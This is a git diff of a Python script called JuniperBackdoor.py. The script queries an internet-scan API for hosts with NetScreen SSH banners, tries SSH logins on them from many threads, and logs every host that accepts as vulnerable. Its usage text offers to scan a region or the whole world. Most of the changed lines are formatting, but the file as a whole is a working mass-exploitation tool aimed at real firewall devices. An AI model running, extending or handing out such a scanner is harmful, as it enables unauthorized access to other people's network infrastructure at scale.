@@ -23,7 +23,9 @@ queue = Queue()
 
 ip_OK = open("ip_OK.txt", "w")
 
+
 class testTarget(threading.Thread):
+
     def __init__(self):
         threading.Thread.__init__(self)
 
@@ -57,26 +59,30 @@ class testTarget(threading.Thread):
                         ip_OK.write("%s\n" % ip)
                         ip_OK.flush()
                     else:
-                        print "%s is not vul" %ip
+                        print "%s is not vul" % ip
             time.sleep(1)
+
 
 def connectSSH(host, user, passwd):
     try:
         ssh = pxssh.pxssh()
-        ssh.login(host, user, passwd, auto_prompt_reset = False)
+        ssh.login(host, user, passwd, auto_prompt_reset=False)
         return ssh
     except Exception, e:
         print "%s is not vul" % host
 
+
 def getIp(query, page):
     start_time = time.time()
     data = {
-        "query":query, 
-        "page":page, 
-        "fields":["ip"]
+        "query": query,
+        "page": page,
+        "fields": ["ip"]
     }
     try:
-        res = requests.post(API_URL + "/search/ipv4", data=json.dumps(data), auth=(UID, SECRET))
+        res = requests.post(
+            API_URL + "/search/ipv4", data=json.dumps(data), auth=(
+                UID, SECRET))
     except:
         pass
     else:
@@ -93,6 +99,7 @@ def getIp(query, page):
                 for result in result_iter:
                     queue.put(result["ip"])
 
+
 def test():
     for i in range(thread_num):
         t = testTarget()
@@ -102,18 +109,22 @@ if __name__ == '__main__':
     if len(sys.argv) != 2:
         print """
 usage: 
-    using python JuniperBackdoor.py [country] to scan the hosts
-    in the country you set
+    using python JuniperBackdoor.py [region] to scan the hosts
+    in the region you set
     
     using python JuniperBackdoor.py ALL to scan the hole world
         """
         sys.exit()
     else:
-        country = sys.argv[1]
-        if country == "ALL":
+        region = sys.argv[1]
+        if region == "ALL":
             query = "22.ssh.banner.software_version:NetScreen"
+        elif region == "china":
+            query = "22.ssh.banner.software_version:NetScreen AND \
+            location.country:%s" % region
         else:
-            query = "22.ssh.banner.software_version:NetScreen AND location.country:%s" % country
+            query = "22.ssh.banner.software_version:NetScreen AND \
+            location.province:%s" % region
     getIp(query, cur_page)
     if not queue.empty():
         test()
